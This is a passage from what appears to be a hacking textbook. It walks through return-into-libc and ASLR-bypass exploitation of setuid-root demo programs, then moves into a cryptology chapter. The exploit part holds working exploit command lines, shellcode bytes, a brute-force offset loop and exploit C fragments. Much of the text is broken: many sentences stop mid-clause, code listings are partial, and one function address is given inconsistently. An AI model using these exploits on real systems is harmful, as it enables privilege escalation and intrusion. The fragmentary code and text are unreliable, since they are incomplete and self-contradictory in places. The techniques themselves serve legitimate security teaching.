nonexecutable.\nWhen this is done, shellcode inserted anywhere on the stack is basically useless.\nThis type of defense will stop the majority of exploits out there, and it is\nbecoming more popular. The latest version of OpenBSD has a nonexecutable\nstack by default, and a nonexecutable stack is available in Linux through PaX,\nOf course, there exists a technique used to bypass this protective counter-\nmeasure. This technique is known as returning into libc. libc is a standard C\nlibrary that contains various basic functions, such as printf() and exit(). These\nfunctions are shared, so any program that uses the printf() function directs\nexecution into the appropriate location in libc. An exploit can do the exact\nsame thing and direct a program\u2019s execution into a certain function in libc.\nThe functionality of such an exploit is limited by the functions in libc, which\nis a significant restriction when compared to arbitrary shellcode. However,\nOne of the simplest libc functions to return into is system(). As you recall, this\nfunction takes a single argument and executes that argument with /bin/sh.\nThis function only needs a single argument, which makes it a useful target.\nFor this example, a simple vulnerable program will be used.\nOf course, this program must be compiled and setuid root before it\u2019s truly\n-rwsr-xr-x 1 root reader 6600 2007-09-30 22:43 ./vuln\nThe general idea is to force the vulnerable program to spawn a shell,\nwithout executing anything on the stack, by returning into the libc function\nsystem(). If this function is supplied with the argument of /bin/sh, this should\nFirst, the location of the system() function in libc must be determined.\nThis will be different for every system, but once the location is known, it will\nremain the same until libc is recompiled. One of the easiest ways to find the\nlocation of a libc function is to create a simple dummy program and debug it,\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n$1 = {<text variable, no debug info>} 0xb7ed0d80 <system>\nHere, a dummy program is created that uses the system() function.\nAfter it\u2019s compiled, the binary is opened in a debugger and a breakpoint is\nset at the beginning. The program is executed, and then the location of the\nsystem() function is displayed. In this case, the system() function is located\nArmed with that knowledge, we can direct program execution into the\nsystem() function of libc. However, the goal here is to cause the vulnerable\nprogram to execute system(\"/bin/sh\") to provide a shell, so an argument\nmust be supplied. When returning into libc, the return address and function\narguments are read off the stack in what should be a familiar format: the\nreturn address followed by the arguments. On the stack, the return-into-libc\nDirectly after the address of the desired libc function is the address to\nwhich execution should return after the libc call. After that, all of the function\nIn this case, it doesn\u2019t really matter where the execution returns to after\nthe libc call, since it will be opening an interactive shell. Therefore, these\nfour bytes can just be a placeholder value of FAKE. There is only one argument,\nwhich should be a pointer to the string /bin/sh. This string can be stored\nanywhere in memory; an environment variable is an excellent candidate.\nIn the output below, the string is prefixed with several spaces. This will\nact similarly to a NOP sled, providing us with some wiggle room, since\nsystem(\" /bin/sh\") is the same as system(\"  /bin/sh\").\nreader@hacking:~/booksrc $ export BINSH=\"         /bin/sh\"\nreader@hacking:~/booksrc $ ./getenvaddr BINSH ./vuln\nSo the system() address is 0xb7ed0d80, and the address for the /bin/sh\nstring will be 0xbffffe5b when the program is executed. That means the\nreturn address on the stack should be overwritten with a series of addresses,\nbeginning with 0xb7ecfd80, followed by FAKE (since it doesn\u2019t matter where\nexecution goes after the system() call), and concluding with 0xbffffe5b.\nA quick binary search shows that the return address is probably over-\nwritten by the eighth word of the program input, so seven words of dummy\nreader@hacking:~/booksrc $ ./vuln $(perl -e 'print \"ABCD\"x5')\nreader@hacking:~/booksrc $ ./vuln $(perl -e 'print \"ABCD\"x10')\nreader@hacking:~/booksrc $ ./vuln $(perl -e 'print \"ABCD\"x8')\nreader@hacking:~/booksrc $ ./vuln $(perl -e 'print \"ABCD\"x7')\nreader@hacking:~/booksrc $ ./vuln $(perl -e 'print \"ABCD\"x7 . \"\\x80\\x0d\\xed\\xb7FAKE\\x5b\\xfe\\\nThe exploit can be expanded upon by making chained libc calls, if\nneeded. The return address of FAKE used in the example can be changed to\ndirect program execution. Additional libc calls can be made, or execution\ncan be directed into some other useful section in the program\u2019s existing\nAnother protective countermeasure tries a slightly different approach. Instead\nof preventing execution on the stack, this countermeasure randomizes the\nstack memory layout. When the memory layout is randomized, the attacker\nwon\u2019t be able to return execution into waiting shellcode, since he won\u2019t know\nThis countermeasure has been enabled by default in the Linux kernel\nsince 2.6.12, but this book\u2019s LiveCD has been configured with it turned off.\nTo turn this protection on again, echo 1 to the /proc filesystem as shown\nroot@hacking:~ # echo 1 > /proc/sys/kernel/randomize_va_space\nreader@hacking:~/booksrc $ gcc exploit_notesearch.c\nWith this countermeasure turned on, the notesearch exploit no longer\nworks, since the layout of the stack is randomized. Every time a program\nstarts, the stack begins at a random location. The following example demon-\nThis program has an obvious buffer overflow vulnerability in it. However,\nreader@hacking:~/booksrc $ gcc -g -o aslr_demo aslr_demo.c\nreader@hacking:~/booksrc $ ./aslr_demo $(perl -e 'print \"ABCD\"x20')\nNotice how the location of the buffer on the stack changes with every\nrun. We can still inject the shellcode and corrupt memory to overwrite the\nreturn address, but we don\u2019t know where the shellcode is in memory. The\nrandomization changes the location of everything on the stack, including\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./aslr_demo\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./aslr_demo\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./aslr_demo\nThis type of protection can be very effective in stopping exploits by the\naverage attacker, but it isn\u2019t always enough to stop a determined hacker. Can\nyou think of a way to successfully exploit this program under these conditions?\nSince ASLR doesn\u2019t stop the memory corruption, we can still use a brute-\nforcing BASH script to figure out the offset to the return address from the\nbeginning of the buffer. When a program exits, the value returned from the\nmain function is the exit status. This status is stored in the BASH variable $?,\nwhich can be used to detect whether the program crashed.\nreader@hacking:~/booksrc $ ./aslr_demo $(perl -e 'print \"AAAA\"x50')\nUsing BASH\u2019s if statement logic, we can stop our brute-forcing script\nwhen it crashes the target. The if statement block is contained between the\nkeywords then and fi; the whitespace in the if statement is required. The\nbreak statement tells the script to break out of the for loop.\n> echo \"==>  Correct offset to return address is $i words\"\nKnowing the proper offset will let us overwrite the return address.\nHowever, we still cannot execute shellcode since its location is randomized.\nUsing GDB, let\u2019s look at the program just as it\u2019s about to return from the\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n0x080483c7 <main+19>:   mov    DWORD PTR [esp+4],eax\n0x080483cb <main+23>:   mov    DWORD PTR [esp],0x80484d4\n0x080483d2 <main+30>:   call   0x80482d4 <printf@plt>\n0x080483d7 <main+35>:   cmp    DWORD PTR [ebp+8],0x1\n0x080483dd <main+41>:   mov    eax,DWORD PTR [ebp+12]\n0x080483e5 <main+49>:   mov    DWORD PTR [esp+4],eax\n0x080483ef <main+59>:   call   0x80482c4 <strcpy@plt>\nBreakpoint 1 at 0x80483fa: file aslr_demo.c, line 12.\nThe breakpoint is set at the last instruction of main. This instruction returns\nEIP to the return address stored on the stack. When an exploit overwrites the\nreturn address, this is the last instruction where the original program has\ncontrol. Let\u2019s take a look at the registers at this point in the code for a couple\nBreakpoint 1, 0x080483fa in main (argc=134513588, argv=0x1) at aslr_demo.c:12\neip            0x80483fa        0x80483fa <main+70>\nThe program being debugged has been started already.\nBreakpoint 1, 0x080483fa in main (argc=134513588, argv=0x1) at aslr_demo.c:12\nThe program being debugged has been started already.\nBreakpoint 1, 0x080483fa in main (argc=134513588, argv=0x1) at aslr_demo.c:12\nDespite the randomization between runs, notice how similar the address\nin ESP is to the address of the buffer (shown in bold). This makes sense, since\nthe stack pointer points to the stack and the buffer is on the stack. ESP\u2019s value\nand the buffer\u2019s address are changed by the same random value, because\nGDB\u2019s stepi command steps the program forward in execution by a single\ninstruction. Using this, we can check ESP\u2019s value after the ret instruction has\nThe program being debugged has been started already.\nBreakpoint 1, 0x080483fa in main (argc=134513588, argv=0x1) at aslr_demo.c:12\n0xb7e4debc in __libc_start_main () from /lib/tls/i686/cmov/libc.so.6\n0xbfd1ccb0:     0x00000000      0x080495cc      0xbfd1ccc8      0x08048291\n0xbfd1ccc0:     0xb7f3d729      0xb7f74ff4      0xbfd1ccf8      0x08048429\n0xbfd1ccd0:     0xb7f74ff4      0xbfd1cd8c      0xbfd1ccf8      0xb7f74ff4\n0xbfd1cce0:     0xb7f937b0      0x08048410      0x00000000      0xb7f74ff4\n0xbfd1ccf0:     0xb7f9fce0      0x08048410      0xbfd1cd58      0xb7e4debc\n0xbfd1cd00:     0x00000001      0xbfd1cd84      0xbfd1cd8c      0xb7fa0898\nSingle stepping shows that the ret instruction increases the value of ESP by\n4. Subtracting the value of ESP from the address of the buffer, we find that ESP\nis pointing 80 bytes (or 20 words) from the start of the buffer. Since the return\naddress\u2019s offset was 19 words, this means that after main\u2019s final ret instruction,\nESP points to stack memory found directly after the return address. This would\nbe useful if there was a way to control EIP to go where ESP is pointing instead.\nThe technique described below doesn\u2019t work with Linux kernels starting\nfrom 2.6.18. This technique gained some popularity and, of course, the\ndevelopers patched the problem. The kernel used in the included LiveCD\nis 2.6.20, so the output below is from the machine loki, which is running a\n2.6.17 Linux kernel. Even though this particular technique doesn\u2019t work on\nthe LiveCD, the concepts behind it can be applied in other useful ways.\nBouncing off linux-gate refers to a shared object, exposed by the kernel,\nwhich looks like a shared library. The program ldd shows a program\u2019s\nshared library dependencies. Do you notice anything interesting about\nLinux hacking 2.6.17 #2 SMP Sun Apr 11 03:42:05 UTC 2007 i686 GNU/Linux\nmatrix@loki /hacking $ cat /proc/sys/kernel/randomize_va_space\nlibpthread.so.0 => /lib/libpthread.so.0 (0xb7e62000)\nlibpthread.so.0 => /lib/libpthread.so.0 (0xb7e1d000)\nEven in different programs and with ASLR enabled, linux-gate.so.1 is\nalways present at the same address. This is a virtual dynamically shared object\nused by the kernel to speed up system calls, which means it\u2019s needed in\nevery process. It is loaded straight from the kernel and doesn\u2019t exist anywhere\nThe important thing is that every process has a block of memory contain-\ning linux-gate\u2019s instructions, which are always at the same location, even\nwith ASLR. We are going to search this memory space for a certain assembly\ninstruction, jmp esp. This instruction will jump EIP to where ESP is pointing.\nFirst, we assemble the instruction to see what it looks like in machine code.\n00000000  ff e4                                             |..|\nUsing this information, a simple program can be written to find this\nWhen the program is compiled and run, it shows that this instruction\nexists at 0xffffe777. This can be further verified using GDB:\nUsing host libthread_db library \"/lib/libthread_db.so.1\".\nBreakpoint 1 at 0x80483f0: file aslr_demo.c, line 7.\nBreakpoint 1, main (argc=1, argv=0xbf869894) at aslr_demo.c:7\n7               printf(\"buffer is at %p\\n\", &buffer);\nPutting it all together, if we overwrite the return address with the address\n0xffffe777, then execution will jump into linux-gate when the main function\nreturns. Since this is a jmp esp instruction, execution will immediately jump\nback out of linux-gate to wherever ESP happens to be pointing. From our\nprevious debugging, we know that at the end of the main function, ESP is\npointing to memory directly after the return address. So if shellcode is put\nmatrix@loki /hacking $ sudo chown root:root ./aslr_demo\nmatrix@loki /hacking $ ./aslr_demo $(perl -e 'print \"\\x77\\xe7\\xff\\xff\"x20')$(cat scode.bin)\nThis technique can also be used to exploit the notesearch program, as\nmatrix@loki /hacking $ for i in `seq 1 50`; do ./notesearch $(perl -e \"print 'AAAA'x$i\"); if [\n$? == 139 ]; then echo \"Try $i words\"; break; fi; done\nmatrix@loki /hacking $ ./notesearch $(perl -e 'print \"\\x77\\xe7\\xff\\xff\"x35')$(cat scode.bin)\nmatrix@loki /hacking $ ./notesearch $(perl -e 'print \"\\x77\\xe7\\xff\\xff\"x36')$(cat scode2.bin)\nThe initial estimate of 35 words was off, since the program still crashed\nwith the slightly smaller exploit buffer. But it is in the right ballpark, so a\nmanual tweak (or a more accurate way to calculate the offset) is all that is\nSure, bouncing off linux-gate is a slick trick, but it only works with older\nLinux kernels. Back on the LiveCD, running Linux 2.6.20, the useful instruc-\ntion is no longer found in the usual address space.\nLinux hacking 2.6.20-15-generic #2 SMP Sun Apr 15 07:36:31 UTC 2007 i686 GNU/Linux\nreader@hacking:~/booksrc $ gcc -o find_jmpesp find_jmpesp.c\nreader@hacking:~/booksrc $ gcc -g -o aslr_demo aslr_demo.c\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./aslr_demo\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./aslr_demo\nWithout the jmp esp instruction at a predictable address, there is no\neasy way to bounce off of linux-gate. Can you think of a way to bypass ASLR\nSituations like this are what makes hacking an art. The state of computer\nsecurity is a constantly changing landscape, and specific vulnerabilities are\ndiscovered and patched every day. However, if you understand the concepts\nof the core hacking techniques explained in this book, you can apply them in\nnew and inventive ways to solve the problem du jour. Like LEGO bricks,\nthese techniques can be used in millions of different combinations and\nconfigurations. As with any art, the more you practice these techniques, the\nbetter you\u2019ll understand them. With this understanding comes the wisdom to\nguesstimate offsets and recognize memory segments by their address ranges.\nIn this case, the problem is still ASLR. Hopefully, you have a few bypass\nideas you might want to try out now. Don\u2019t be afraid to use the debugger to\nexamine what is actually happening. There are probably several ways to bypass\nASLR, and you may invent a new technique. If you don\u2019t find a solution, don\u2019t\nworry\u2014I\u2019ll explain a method in the next section. But it\u2019s worthwhile to think\nabout this problem a little on your own before reading ahead.\nIn fact, I had written this chapter before linux-gate was fixed in the Linux\nkernel, so I had to hack together an ASLR bypass. My first thought was to\nleverage the execl() family of functions. We\u2019ve been using the execve()\nfunction in our shellcode to spawn a shell, and if you pay close attention\n(or just read the man page), you\u2019ll notice the execve() function replaces the\ncurrently running process with the new process image.\nexecl, execlp, execle, execv, execvp - execute a file\nint execlp(const char *file, const char *arg, ...);\nThe  exec()  family  of  functions  replaces the current process\nimage with a new process image.  The functions described in this\nmanual page are front-ends for the function execve(2).  (See the\nmanual page for execve()  for  detailed  information  about  the\nIt seems like there could be a weakness here if the memory layout is\nrandomized only when the process is started. Let\u2019s test this hypothesis with a\npiece of code that prints the address of a stack variable and then executes\n// Start aslr_demo to see how its stack is arranged.\nWhen this program is compiled and executed, it will execl() aslr_demo,\nwhich also prints the address of a stack variable (buffer). This lets us compare\nreader@hacking:~/booksrc $ gcc -o aslr_demo aslr_demo.c\nreader@hacking:~/booksrc $ gcc -o aslr_execl aslr_execl.c\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbf832044 - 0xbf832000\"\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbfa97844 - 0xbf82f800\"\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbfbb0bc4 - 0xbff3e710\"\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbf9a81b4 - 0xbf9a8180\"\nThe first result looks very promising, but further attempts show that\nthere is some degree of randomization happening when the new process is\nexecuted with execl(). I\u2019m sure this wasn\u2019t always the case, but the progress\nof open source is rather constant. This isn\u2019t much of a problem though, since\nwe have ways to deal with that partial uncertainty.\nUsing execl() at least limits the randomness and gives us a ballpark address\nrange. The remaining uncertainty can be handled with a NOP sled. A quick\nexamination of aslr_demo shows that the overflow buffer needs to be 80 bytes\nto overwrite the stored return address on the stack.\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nStarting program: /home/reader/booksrc/aslr_demo $(perl -e 'print \"AAAA\"x19 . \"BBBB\"')\nProgram received signal SIGSEGV, Segmentation fault.\nSince we will probably want a rather large NOP sled, in the following\nexploit the NOP sled and the shellcode will be put after the return address\noverwrite. This allows us to inject as much of a NOP sled as needed. In this\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\nret = (unsigned int) &i - offset + 200; // Set return address.\nfor(i=0; i < 90; i+=4) // Fill buffer with return address.\nThis code should make sense to you. The value 200 is added to the return\naddress to skip over the first 90 bytes used for the overwrite, so execution lands\nreader@hacking:~/booksrc $ sudo chown root ./aslr_demo\nreader@hacking:~/booksrc $ sudo chmod u+s ./aslr_demo\nreader@hacking:~/booksrc $ gcc aslr_execl_exploit.c\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbfa3f26c - 0xbfa3ee80\"\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbfb5a38c - 0xbfb20760\"\nAs you can see, occasionally the randomization causes the exploit to fail,\nbut it only needs to succeed once. This leverages the fact that we can try the\nexploit as many times as we want. The same technique will work with the note-\nsearch exploit while ASLR is running. Try writing an exploit to do this.\nOnce the basic concepts of exploiting programs are understood, countless\nvariations are possible with a little bit of creativity. Since the rules of a program\nare defined by its creators, exploiting a supposedly secure program is simply a\nmatter of beating them at their own game. New clever methods, such as stack\nguards and IDSs, try to compensate for these problems, but these solutions\naren\u2019t perfect either. A hacker\u2019s ingenuity tends to find holes in these systems.\nCryptology is defined as the study of cryptography or\ncryptanalysis. Cryptography is simply the process of com-\nmunicating secretly through the use of ciphers, and\ncryptanalysis is the process of cracking or deciphering\nsuch secret communications. Historically, cryptology has been of particular\ninterest during wars, when countries used secret codes to communicate with\ntheir troops while also trying to break the enemy\u2019s codes to infiltrate their\nThe wartime applications still exist, but the use of cryptography in\ncivilian life is becoming increasingly popular as more critical transactions\noccur over the Internet. Network sniffing is so common that the paranoid\nassumption that someone is always sniffing network traffic might not be so\nparanoid. Passwords, credit card numbers, and other proprietary information\ncan all be sniffed and stolen over unencrypted protocols. Encrypted com-\nmunication protocols provide a solution to this lack of privacy and allow\nthe Internet economy to function. Without Secure Sockets Layer (SSL)\nencryption, credit card transactions at popular websites would be either\nAll of this private data is protected by cryptographic algorithms that are\nprobably secure. Currently, cryptosystems that can be proven to be secure\nare far too unwieldy for practical use. So in lieu of a mathematical proof of\nsecurity, cryptosystems that are practically secure are used. This means that it\u2019s\npossible that shortcuts for defeating these ciphers exist, but no one\u2019s been\nable to actualize them yet. Of course, there are also cryptosystems that aren\u2019t\nsecure at all. This could be due to the implementation, key size, or simply\ncryptanalytic weaknesses in the cipher itself. In 1997, under US law, the\nmaximum allowable key size for encryption in exported software was 40 bits.\nThis limit on key size makes the corresponding cipher insecure, as was shown\nby RSA Data Security and Ian Goldberg, a graduate student from the Uni-\nversity of California, Berkeley. RSA posted a challenge to decipher a message\nencrypted with a 40-bit key, and three and a half hours later, Ian had done\njust that. This was strong evidence that 40-bit keys aren\u2019t large enough for a\nCryptology is relevant to hacking in a number of ways. At the purest\nlevel, the challenge of solving a puzzle is enticing to the curious. At a more\nnefarious level, the secret data protected by that puzzle is perhaps even more\nalluring. Breaking or circumventing the cryptographic protections of secret\ndata can provide a certain sense of satisfaction, not to mention a sense of\nthe protected data\u2019s contents. In addition, strong cryptography is useful in\navoiding detection. Expensive network intrusion detection systems designed\nto sniff network traffic for attack signatures are useless if the attacker is using\nan encrypted communication channel. Often, the encrypted Web access\nprovided for customer security is used by attackers as a difficult-to-monitor\nMany of the concepts of cryptographic security stem from the mind of\nClaude Shannon. His ideas have influenced the field of cryptography greatly,\nespecially the concepts of diffusion and confusion. Although the following\nconcepts of unconditional security, one-time pads, quantum key distribution,\nand computational security weren\u2019t actually conceived by Shannon, his ideas\non perfect secrecy and information theory had great influence on the\nA cryptographic system is considered to be unconditionally secure if it\ncannot be broken, even with infinite computational resources. This implies\nthat cryptanalysis is impossible and that even if every possible key were tried\nin an exhaustive brute-force attack, it would be impossible to determine\nOne example of an unconditionally secure cryptosystem is the one-time pad.\nA one-time pad is a very simple cryptosystem that uses blocks of random data\ncalled pads. The pad must be at least as long as the plaintext message that is\nto be encoded, and the random data on the pad must be truly random, in\nthe most literal sense of the word. Two identical pads are made: one for the\nrecipient and one for the sender. To encode a message, the sender simply\nXORs each bit of the plaintext message with the corresponding bit of the\npad. After the message is encoded, the pad is destroyed to ensure that it is\nonly used once. Then the encrypted message can be sent to the recipient with-\nout fear of cryptanalysis, since the encrypted message cannot be broken\nwithout the pad. When the recipient receives the encrypted message, he also\nXORs each bit of the encrypted message with the corresponding bit of his\nWhile the one-time pad is theoretically impossible to break, in reality it\u2019s\nnot really all that practical to use. The security of the one-time pad hinges\non the security of the pads. When the pads are distributed to the recipient\nand the sender, it is assumed that the pad transmission channel is secure.\nTo be truly secure, this could involve a face-to-face meeting and exchange,\nbut for convenience, the pad transmission may be facilitated via yet another\ncipher. The price of this convenience is that the entire system is now only\nas strong as the weakest link, which would be the cipher used to transmit\nthe pads. Since the pad consists of random data of the same length as the\nplaintext message, and since the security of the whole system is only as\ngood as the security of pad transmission, it usually makes more sense to just\nsend the plaintext message encoded using the same cipher that would have\nThe advent of quantum computation brings many interesting things to the\nfield of cryptology. One of these is a practical implementation of the one-\ntime pad, made possible by quantum key distribution. The mystery of quantum\nentanglement can provide a reliable and secret method of sending a random\nstring of bits that can be used as a key. This is done using nonorthogonal\nWithout going into too much detail, the polarization of a photon is the\noscillation direction of its electric field, which in this case can be along the\nhorizontal, vertical, or one of the two diagonals. Nonorthogonal simply means\nthe states are separated by an angle that isn\u2019t 90 degrees. Curiously enough,\nit\u2019s impossible to determine with certainty which of these four polarizations a\nsingle photon has. The rectilinear basis of the horizontal and vertical polariza-\ntions is incompatible with the diagonal basis of the two diagonal polarizations,\nso, due to the Heisenberg uncertainty principle, these two sets of polarizations\ncannot both be measured. Filters can be used to measure the polarizations\u2014\none for the rectilinear basis and one for the diagonal basis. When a photon\npasses through the correct filter, its polarization won\u2019t change, but if it passes\nthrough the incorrect filter, its polarization will be randomly modified. This\nmeans that any eavesdropping attempt to measure the polarization of a\nphoton has a good chance of scrambling the data, making it apparent that\nThese strange aspects of quantum mechanics were put to good use by\nCharles Bennett and Gilles Brassard in the first and probably best-known\nquantum key distribution scheme, called BB84. First, the sender and receiver\nagree on bit representation for the four polarizations, such that each basis\nhas both 1 and 0. In this scheme, 1 could be represented by both vertical\nphoton polarization and one of the diagonal polarizations (positive\n45 degrees), while 0 could be represented by horizontal polarization and\nthe other diagonal polarization (negative 45 degrees). This way, 1s and\n0s can exist when the rectilinear polarization is measured and when the\nThen, the sender sends a stream of random photons, each coming from\na randomly chosen basis (either rectilinear or diagonal), and these photons\nare recorded. When the receiver receives a photon, he also randomly chooses\nto measure it in either the rectilinear basis or the diagonal basis and records\nthe result. Now, the two parties publicly compare which basis they used for\neach photon, and they keep only the data corresponding to the photons they\nboth measured using the same basis. This doesn\u2019t reveal the bit values of the\nphotons, since there are both 1s and 0s in each basis. This makes up the key\nSince an eavesdropper would ultimately end up changing the polarization\nof some of these photons and thus scramble the data, eavesdropping can be\ndetected by computing the error rate of some random subset of the key. If\nthere are too many errors, someone was probably eavesdropping, and the\nkey should be thrown away. If not, the transmission of the key data was secure\nA cryptosystem is considered to be computationally secure if the best-known\nalgorithm for breaking it requires an unreasonable amount of computational\nresources and time. This means that it is theoretically possible for an eaves-\ndropper to break the encryption, but it is practically infeasible to actually do\nso, since the amount of time and resources necessary would far exceed the\nvalue of the encrypted information. Usually, the time needed to break a\ncomputationally secure cryptosystem is measured in tens of thousands of\nyears, even with the assumption of a vast array of computational resources.\nIt\u2019s important to note that the best-known algorithms for breaking crypto-\nsystems are always evolving and being improved. Ideally, a cryptosystem\nwould be defined as computationally secure if the best algorithm for breaking\nit requires an unreasonable amount of computational resources and time,\nbut there is currently no way to prove that a given encryption-breaking algo-\nrithm is and always will be the best one. So, the current best-known algorithm\nis used instead to measure a cryptosystem\u2019s security.\nAlgorithmic run time is a bit different from the run time of a program. Since\nan algorithm is simply an idea, there\u2019s no limit to the processing speed for\nevaluating the algorithm. This means that an expression of algorithmic run\nWithout factors such as processor speed and architecture, the important\nunknown for an algorithm is input size. A sorting algorithm running on 1,000\nelements will certainly take longer than the same sorting algorithm running\non 10 elements. The input size is generally denoted by n, and each atomic\nstep can be expressed as a number. The run time of a simple algorithm, such\nas the one that follows, can be expressed in terms of n.\nThis algorithm loops n times, each time doing two actions, and then\ndoes one last action, so the time complexity for this algorithm would be 2n + 1.\nA more complex algorithm with an additional nested loop tacked on, shown\nbelow, would have a time complexity of n2 + 2n + 1, since the new action is\nBut this level of detail for time complexity is still too granular. For\nexample, as n becomes larger, the relative difference between 2n + 5 and\n2n + 365 becomes less and less. However, as n becomes larger, the relative\ndifference between 2n2 + 5 and 2n + 5 becomes larger and larger. This type\nof generalized trending is what is most important to the run time of an\nConsider two algorithms, one with a time complexity of 2n + 365 and\nthe other with 2n2 + 5. The 2n2 + 5 algorithm will outperform the 2n + 365\nalgorithm on small values for n. But for n = 30, both algorithms perform\nequally, and for all n greater than 30, the 2n + 365 algorithm will outperform\nthe 2n2 + 5 algorithm. Since there are only 30 values for n in which the\n2n2 + 5 algorithm performs better, but an infinite number of values for n\nin which the 2n + 365 algorithm performs better, the 2n + 365 algorithm is\nThis means that, in general, the growth rate of the time complexity of\nan algorithm with respect to input size is more important than the time com-\nplexity for any fixed input. While this might not always hold true for specific\nreal-world applications, this type of measurement of an algorithm\u2019s efficiency\ntends to be true when averaged over all possible applications.\nAsymptotic notation is a way to express an algorithm\u2019s efficiency. It\u2019s called\nasymptotic because it deals with the behavior of the algorithm as the input\nReturning to the examples of the 2n + 365 algorithm and the 2n2 + 5\nalgorithm, we determined that the 2n + 365 algorithm is generally more\nefficient because it follows the trend of n, while the 2n2 + 5 algorithm\nfollows the general trend of n2. This means that 2n + 365 is bounded above\nby a positive multiple of n for all sufficiently large n, and 2n2 + 5 is bounded\nabove by a positive multiple of n2 for all sufficiently large n.\nThis sounds kind of confusing, but all it really means is that there exists a\npositive constant for the trend value and a lower bound on n, such that the\ntrend value multiplied by the constant will always be greater than the time\ncomplexity for all n greater than the lower bound. In other words, 2n2 + 5 is\nin the order of n2, and 2n + 365 is in the order of n. There\u2019s a convenient\nmathematical notation for this, called big-oh notation, which looks like O(n2)\nto describe an algorithm that is in the order of n2.\nA simple way to convert an algorithm\u2019s time complexity to big-oh notation\nis to simply look at the high-order terms, since these will be the terms that\nmatter most as n becomes sufficiently large. So an algorithm with a time\ncomplexity of 3n4 + 43n3 + 763n + log n + 37 would be in the order of O(n4),\nSymmetric ciphers are cryptosystems that use the same key to encrypt and\ndecrypt messages. The encryption and decryption process is generally faster\nthan with asymmetric encryption, but key distribution can be difficult.\nThese ciphers are generally either block ciphers or stream ciphers.\nA block cipher operates on blocks of a fixed size, usually 64 or 128 bits. The\nsame block of plaintext will always encrypt to the same ciphertext block,\nusing the same key. DES, Blowfish, and AES (Rijndael) are all block ciphers.\nStream ciphers generate a stream of pseudo-random bits, usually either one\nbit or byte at a time. This is called the keystream, and it is XORed with the\nplaintext. This is useful for encrypting continuous streams of data. RC4 and\nLSFR are examples of popular stream ciphers. RC4 will be discussed in depth\nDES and AES are both popular block ciphers. A lot of thought goes into\nthe construction of block ciphers to make them resistant to known crypt-\nanalytical attacks. Two concepts used repeatedly in block ciphers are confusion\nand diffusion. Confusion refers to methods used to hide relationships between\nthe plaintext, the ciphertext, and the key. This means that the output bits\nmust involve some complex transformation of the key and plaintext. Diffusion\nserves to spread the influence of the plaintext bits and the key bits over as\nmuch of the ciphertext as possible. Product ciphers combine both of these\nconcepts by using various simple operations repeatedly. Both DES and AES\nDES also uses a Feistel network. It is used in many block ciphers to\nensure that the algorithm is invertible. Basically, each block is divided into\ntwo halves, left (L) and right (R). Then, in one round of operation, the new\nleft half (L i) is set to be equal to the old right half (Ri\u22121), and the new right\nhalf (Ri) is made up of the old left half (Li\u22121) XORed with the output of a\nfunction using the old right half (Ri\u22121) and the subkey for that round (Ki).\nUsually, each round of operation has a separate subkey, which is calculated\nThe values for Li and Ri are as follows (the \u2295 symbol denotes the XOR\nDES uses 16 rounds of operation. This number was specifically chosen to\ndefend against differential cryptanalysis. DES\u2019s only real known weakness is\nits key size. Since the key is only 56 bits, the entire keyspace can be checked\nin an exhaustive brute-force attack in a few weeks on specialized hardware.\nTriple-DES fixes this problem by using two DES keys concatenated\ntogether for a total key size of 112 bits. Encryption is done by encrypting the\nplaintext block with the first key, then decrypting with the second key, and\nthen encrypting again with the first key. Decryption is done analogously, but\nwith the encryption and decryption operations switched. The added key size\nmakes a brute-force effort exponentially more difficult.\nMost industry-standard block ciphers are resistant to all known forms of\ncryptanalysis, and the key sizes are usually too big to attempt an exhaustive\nbrute-force attack. However, quantum computation provides some interesting\nQuantum computation gives the promise of massive parallelism. A quantum\ncomputer can store many different states in a superposition (which can be\nthought of as an array) and perform calculations on all of them at once.\nThis is ideal for brute forcing anything, including block ciphers. The super-\nposition can be loaded up with every possible key, and then the encryption\noperation can be performed on all the keys at the same time. The tricky part\nis getting the right value out of the superposition. Quantum computers are\nweird in that when the superposition is looked at, the whole thing decoheres\ninto a single state. Unfortunately, this decoherence is initially random, and\nthe odds of decohering into each state in the superposition are equal.\nWithout some way to manipulate the odds of the superposition states,\nthe same effect could be achieved by just guessing keys. Fortuitously, a man\nnamed Lov Grover came up with an algorithm that can manipulate the odds\nof the superposition states. This algorithm allows the odds of a certain desired\nstate to increase while the others decrease. This process is repeated several\ntimes until the decohering of the superposition into the desired state is\nUsing some basic exponential math skills, you will notice that this just\neffectively halves the key size for an exhaustive brute-force attack. So, for the\nultra paranoid, doubling the key size of a block cipher will make it resistant\nto even the theoretical possibilities of an exhaustive brute-force attack with a\nAsymmetric ciphers use two keys: a public key and a private key. The public\nkey is made public, while the private key is kept private; hence the clever names.\nAny message that is encrypted with the public key can only be decrypted with\nthe private key. This removes the issue of key distribution\u2014public keys are\npublic, and by using the public key, a message can be encrypted for the\ncorresponding private key. Unlike symmetric ciphers, there\u2019s no need for an\nout-of-band communication channel to transmit the secret key. However,\nasymmetric ciphers tend to be quite a bit slower than symmetric ciphers.\nRSA is one of the more popular asymmetric algorithms. The security of RSA\nis based on the difficulty of factoring large numbers. First, two prime numbers\nare chosen, P and Q, and their product, N, is computed:\nThen, the number of numbers between 1 and N \u2212 1 that are relatively\nprime to N must be calculated (two numbers are relatively prime if their greatest\ncommon divisor is 1). This is known as Euler\u2019s totient function, and it is usually\nFor example, \u03c6(9) = 6, since 1, 2, 4, 5, 7, 